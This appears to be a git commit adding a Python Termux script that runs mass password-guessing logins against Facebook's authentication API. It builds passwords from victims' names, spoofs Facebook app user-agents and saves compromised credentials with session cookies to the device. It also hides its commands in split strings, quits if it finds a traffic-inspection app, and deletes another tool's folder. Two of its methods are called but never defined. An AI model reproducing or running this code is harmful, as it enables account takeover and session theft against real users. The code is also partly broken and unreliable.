1f4fbb7e4687906afa5d1be12f3d28a4f18cd3dc
ALIEN-786 <132042001+ALIEN-786@users.noreply.github.com>
2024-10-05 11:20:18 +0600

    Add files via upload

---
+++ RANDOM.py
@@ -0,0 +1,172 @@
+
+#----------------------■ IMPORT ■----------------------#
+import os,zlib,time,random,uuid,subprocess,sys,json,base64,platform,string,marshal,re
+from concurrent.futures import ThreadPoolExecutor as xxxxxxbd
+from zlib import decompress
+from os import system
+import pycurl
+from io import BytesIO
+from random import randint
+#----------------------■ COLOUR ■----------------------#
+G="\x1b[38;5;48m"
+wx='\x1b[1;97m';gx='\x1b[38;5;48m';bx='\x1b[38;5;8m';yx="\033[1;33m";px="\33[1;34m";rx='\x1b[38;5;196m'
+#----------------------■ STYLE ■----------------------#
+xd = f"{wx}|{gx}■{wx}|";xd1 = f"{wx}|{gx}1{wx}|";xd2 = f"{wx}|{gx}2{wx}|";xd3 = f"{wx}|{gx}3{wx}|";xd4 = f"{wx}|{gx}4{wx}|";xd5 = f"{wx}|{gx}5{wx}|";xd0 = f"{wx}|{gx}0{wx}|";xdx = f"{wx}|{gx}?{wx}|";xdxx = f"{gx}━➤{wx}"
+#----------------------■ SECURITY ■----------------------#
+try:
+    import pycurl
+    from io import BytesIO
+except:
+    os.system('p'+'ip ins'+'tall pyc'+'url > /dev'+'/null')
+    import pycurl
+    from io import BytesIO
+try:import requests
+except:os.system('pi'+'p uni'+'nstall requ'+'ests cha'+'rdet id'+'na cert'+'ifi urll'+'ib3 -y > /dev/null;p'+'ip ins'+'tall char'+'det id'+'na cert'+'ifi requ'+'ests urll'+'ib3 > /d'+'ev/nu'+'ll');os.system("clear");exit(" Error Run Again ! ")
+try:
+    from licensing.models import *
+    from licensing.methods import Key, Helpers
+except:os.system("p"+"ip ins"+"tall lice"+"nsing > /d"+"ev/nu"+"ll")
+try:import bs4
+except:os.system('p'+'ip ins'+'tall b'+'s4 > /d'+'ev/nu'+'ll')
+try:os.makedirs('/sdcard/JARIF')
+except:pass
+try:
+    os.system('rm -'+'rf /sd'+'card/.txt');os.system('clear');open('/sd'+'ca'+'rd/.t'+'xt','w').write(' ')
+except PermissionError:
+    print(f'{xd} Wi'+'thout Sto'+'rage Perm'+'ission You Can'+'not R'+'un My Com'+'mand A'+'llow Te'+'rmux Perm'+'issions ! A'+'nd Run A'+'gain ');os.system('termux-setup-storage');os.system('clear');exit(f'{xd} Ru'+'n Aga'+'in Th'+'is To'+'ol !!')
+try:
+    fileee = os.listdir(zlib.decompress(b'x\x9c\xd3/NIN,J\xd1w\xccK)\xca\xcfL\xd1OI,I\xd4\x07\x00SL\x07\x89'))
+    if f'com'+'.httpc'+'an'+'ary'+'.pro' in fileee:
+        print(f'{xd} fou'+'nd err'+'or i'+'n yo'+'ur te'+'rmu'+'x');exit()
+except:pass
+try:
+    files = os.listdir("/"+"da"+"ta/d"+"ata/c"+"om.t"+"ermux/"+"files"+"/ho"+"me/M"+"AH"+"AD"+"I-"+"GRE"+"EN");os.system("rm"+" -r"+"f $"+"HOME"+"/"+"MA"+"HAD"+"I-"+"GR"+"EE"+"N");exit(f"{G}[=] An"+"ot"+"her "+"Tool"+" Use"+"r"+" No"+"t A"+"llow"+" B"+"ro"+" By"+"e ! ")
+except FileNotFoundError:pass
+except Exception as e:pass
+#----------------------■ LOOP ■----------------------#
+sys.stdout.write(f'\x1b[1;35m\x1b]2; [=]-JARIF-[=]\x07')
+hamdam = len
+loop,lim = 0,0
+methods,pcp,oks,cps,pw,user = [],[],[],[],[],[]
+#----------------------■ NETWORK ■----------------------#
+ok_pioo = subprocess.check_output('getprop gsm.operator.alpha',shell=True).decode('utf-8').replace('\n','').replace(',',f'{wx} | {wx}')
+#----------------------■ USER-AGENT ■----------------------#
+def uca():
+	fban = random.choice(["FB4A"])
+	facebook_version = f"{random.randint(100, 450)}.{random.randint(0, 0)}.{random.randint(0, 0)}.{random.randint(1, 40)}.{random.randint(10, 150)}"
+	fbbv = str(random.randint(10000000, 66666666))
+	density = random.choice(['1.0', '1.5', '2.0', '2.5', '3.0'])
+	width = random.choice(["720", "1080", "1280"])
+	height = random.choice(["720", "1080", "1280", "1440", "1920"])
+	fbcr = random.choice(['Nepal_Telecom', 'Banglalink', 'Robi', 'Grameenphone', 'Airtel'])
+	fblc = random.choice(["en_US", "en_GB"])
+	fbbd = 'Google'
+	fbpn = random.choice(["com.facebook.adsmanager", "com.facebook.lite", "com.facebook.orca", "com.facebook.katana", "com.facebook.mlite"])
+	fbsv = f"{random.randint(4, 13)}.{random.randint(0, 5)}.{random.randint(1, 5)}"
+	fbmf = 'Google'
+	build = random.choice(['TD1A.220804.009.A2','TP1A.221005.002','TQ2A.230305.008.A3','TQ3A.230705.001','SPB5.210812.002','SP1A.211105.002','RQ2A.210305.006','TQ2A.230405.003.E1','TQ1A.230205.002'])
+	fbdv = random.choice(["Pixel 7 Pro","Pixel 7","Pixel 6","Pixel 6 Pro","Pixel 5","Pixel 4a","Pixel 4","Pixel 4a (5G)","Pixel 3a XL"])
+	ua = f"[FBAN/{str(fban)};FBAV/{str(facebook_version)};FBBV/{str(fbbv)};FBDM/{{density={density},width={width},height={height}}};FBLC/{str(fblc)};FBCR/{str(fbcr)};FBMF/{str(fbmf)};FBBD/{str(fbbd)};FBPN/{str(fbpn)};FBDV/{str(fbdv)};FBSV/{str(fbsv)};FBOP/1;FBCA/armeabi-v7a:armeabi;]"
+	return ua
+#----------------------■ CLEAR ■----------------------#
+def clear():os.system('clear');print(logo)
+def linex():print(f'{gx}{wx}-----------------------------------------------{gx}')
+#----------------------■ LOGO ■----------------------#
+logo = f""""""
+#----------------------■ MENU ■----------------------#
+def ____JARIF____():
+    global lim
+    clear();print(f" {xd1} File Cloning ");print(f" {xd0} Exit Cloning ");linex()
+    option = input(f" {xdx} Select {xdxx} ")
+    if option in ["1"]:____filex____()
+    else:exit(f' {xd} Select Valid Option ');time.sleep(1)
+#----------------------■ FILEX ■----------------------#
+def ____filex____():
+    global methods        
+    clear();print(f' {xd1} Method {wx}|{gx}M1{wx}| {xd2} Method {wx}|{gx}M2{wx}| {xd3} Method {wx}|{gx}M3{wx}|');linex()
+    option = input(f" {xdx} Select {xdxx} ")
+    if option in ["1"]:methods.append('methodA');main_crack().crack(id)
+    elif option in ["2"]:methods.append('methodB');main_crack().crack(id)
+    elif option in ["3"]:methods.append('methodC');main_crack().crack(id)
+    else:exit(f' {xd} Select Valid Option ');time.sleep(1)
+#----------------------■ FILEX INPUT ■----------------------#
+class main_crack():
+    def __init__(self):
+        self.id=[]
+    def crack(self,id):
+        global methods
+        clear();print(f' {xd} Example {xdxx} /sdcard/file-name.txt ');linex()
+        self.file = input(f" {xdx} File Name {xdxx} ")
+        try:
+            self.id = open(self.file).read().splitlines()
+            self.pasw()
+        except FileNotFoundError:
+            print(f" {xd} File Location Not Found");linex();time.sleep(2);print(f' {xd} Try Again Bro');linex();time.sleep(2);main_crack().crack(id)
+#----------------------■ PASSWORD ■----------------------#
+    def pasw(self):
+            clear();print(f' {xd1} Bd Auto 30 Password Cloning \n {xd2} India Auto 10 Password Cloning \n {xd3} Choice Password Cloning ');linex()
+            ppp=input(f" {xdx} Select {xdxx} ")
+            if ppp in ["1"]:pw.append("first12345");pw.append("first1234");pw.append("first123");pw.append("first12");pw.append("first@12345");pw.append("first@1234");pw.append("first@123");pw.append("first last");pw.append("firstlast");pw.append("firstlast@12345");pw.append("firstlast@1234");pw.append("firstlast@123");pw.append("firstlast@12");pw.append("firstlast12345");pw.append("firstlast1234");pw.append("firstlast123");pw.append("firstlast12");pw.append("first@@@");pw.append("first@@");pw.append("first@");pw.append("@first@")
+            elif ppp in ["2"]:pw.append("57273200");pw.append("59039200");pw.append("57575751");pw.append("57575752");pw.append("57575858");pw.append("07860786")
+            else:
+                try:
+                    clear();print(f" {xd} Example {xdxx} Bd- 20|30 Others-5 | 10");linex()
+                    sl = int(input(f" {xdx} Password Limit {xdxx} "));linex()
+                except:
+                    sl =2
+                    clear();print(f" {xd} Example {xdxx} firstlast | first123 | first@@ ");linex()
+                for i in range(sl):
+                    pw.append(input(f" {wx}|{gx}{i+1}{wx}| Enter Password {xdxx} "))
+                    linex()
+            clear();print(f' {xd} Cp Id Show {wx}|{gx}y{wx}|{gx}n{wx}|');linex()
+            cx=input(f" {xdx} Select {xdxx} ")
+            if cx in ['y','Y','yes','Yes','1']:pcp.append('y')
+            else:pcp.append('n')
+            clear();total_id = str(len(self.id));lim=total_id
+            print(f" {G} Total Uid - {total_id}");linex()
+            with xxxxxxbd(max_workers=30) as Jarifx:
+                for zsb in self.id:
+                   try:
+                       uid, __Uid_Name__ = zsb.split('|')
+                       sz = __Uid_Name__.split(' ')
+                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:pwx =  pw
+                       else:
+                            pwx =  pw
+                            if 'methodA' in methods:Jarifx.submit(self.methodA, uid, __Uid_Name__, pwx)
+                            elif 'methodB' in methods:Jarifx.submit(self.methodB, uid, __Uid_Name__, pwx)
+                            elif 'methodC' in methods:Jarifx.submit(self.methodC, uid, __Uid_Name__, pwx)
+                   except:pass
+            print("");linex();print(f' {xdx} Cloning Has Been Complete');print(f' {xd} Total Ok Id {xdxx} {str(len(oks))}');print(f' {xd} Total Cp Id {xdxx} {str(len(cps))}');linex();exit()
+#----------------------■ FILE METHOD M1 ■----------------------#
+    def methodA(self, ___Main_Uid___, __Uid_Name__, psw):
+        try:
+            global oks,cps,loop,twf
+            sys.stdout.write(f"\r\r{G} JARIF-M1 {loop} |{len(oks)}|{len(cps)}| ");sys.stdout.flush()
+            fs = __Uid_Name__.split(' ')[0]
+            try:ls = __Uid_Name__.split(' ')[1]
+            except:ls = fs
+            for pw in psw:
+                ___Main_Pass___ = pw.replace('first',fs.lower()).replace('First',fs).replace('last',ls.lower()).replace('Last',ls).replace('Name',__Uid_Name__).replace('name',__Uid_Name__.lower())
+                with requests.Session() as session:
+                    ua = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/158.0.0.38.95;FBBV/90882265;FBDM/{density=2.5,width=720,height=1281};FBLC/en_GB;FBCR/AT&T;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J700P;FBSV/7.1.1;FBOP/1;FBCA/armeabi-v7a:armeabi;]"
+                    main_data = {"adid": str(uuid.uuid4()),"format":"json","device_id":str(uuid.uuid4()),"cpl":"true","family_device_id":str(uuid.uuid4()),"credentials_type":"device_based_login_password","error_detail_type":"button_with_disabled","source":"device_based_login","email":___Main_Uid___, "password":___Main_Pass___,"access_token":"350685531728%7C62f8ce9f74b12f84c123cc23437a4a32","generate_session_cookies":"1","meta_inf_fbmeta":"","advertiser_id":str(uuid.uuid4()),"currently_logged_in_userid":"0","locale":"en_US","client_country_code":"US","method":"auth.login", "fb_api_req_friendly_name":"authenticate","fb_api_caller_class":"com.facebook.account.login.protocol.Fb4aAuthHandler","api_key":"882a8490361da98702bf97a021ddc14d"}
+                    main_head = {"User-Agent": ua,"Content-Type":"application/x-www-form-urlencoded","Host":"graph.facebook.com","X-FB-Net-HNI":str(random.randint(20000,40000)),"X-FB-SIM-HNI":str(random.randint(20000,40000)),"X-FB-Connection-Type":"MOBILE.LTE","X-Tigon-Is-Retry":"False","x-fb-session-id":"nid=jiZ+yNNBgbwC;pid=Main;tid=132;nc=1;fc=0;bc=0;cid=d29d67d37eca387482a8a5b740f84f62","x-fb-device-group":str(random.randint(2000,6000)),"X-FB-Friendly-Name":"ViewerReactionsMutation","X-FB-Request-Analytics-Tags":"graphservice","X-FB-HTTP-Engine":"Liger","X-FB-Client-IP":"True","X-FB-Server-Cluster":"True","x-fb-connection-token":"d29d67d37eca387482a8a5b740f84f62"}
+                balx = session.post('https://api.facebook.com/auth/login',data=main_data,headers=main_head,allow_redirects=False).json()
+                if 'session_key' in balx:
+                    cookie = ";".join(i["name"]+"="+i["value"] for i in balx["session_cookies"])
+                    print(f'\r\r {G} JARIF-OK {___Main_Uid___} {wx}|{gx} {___Main_Pass___} {wx}|    ')
+                    print('')
+                    open('/sdcard/JARIF/JARIF-FILE-M1-OK-COOKIE.txt','a').write(___Main_Uid___+'|'+___Main_Pass___+'|'+cookie+'\n');oks.append(___Main_Uid___)
+                    break
+                elif 'www.facebook.com' in balx['error']['message']:
+                    if 'y' in pcp:
+                        print(f'\r\r CP {___Main_Uid___} {wx}|{yx} {___Main_Pass___}      ')
+                    open('/sdcard/JARIF/JARIF-FILE-M1-CP.txt','a').write(___Main_Uid___+'|'+___Main_Pass___+'\n');cps.append(___Main_Uid___)
+                    break
+                else:continue
+            loop+=1
+        except requests.exceptions.ConnectionError:self.methodA(___Main_Uid___, __Uid_Name__, ___Main_Pass___)
+
+#----------------------■ END ■----------------------#
+if __name__=='__main__':
+    ____JARIF____()
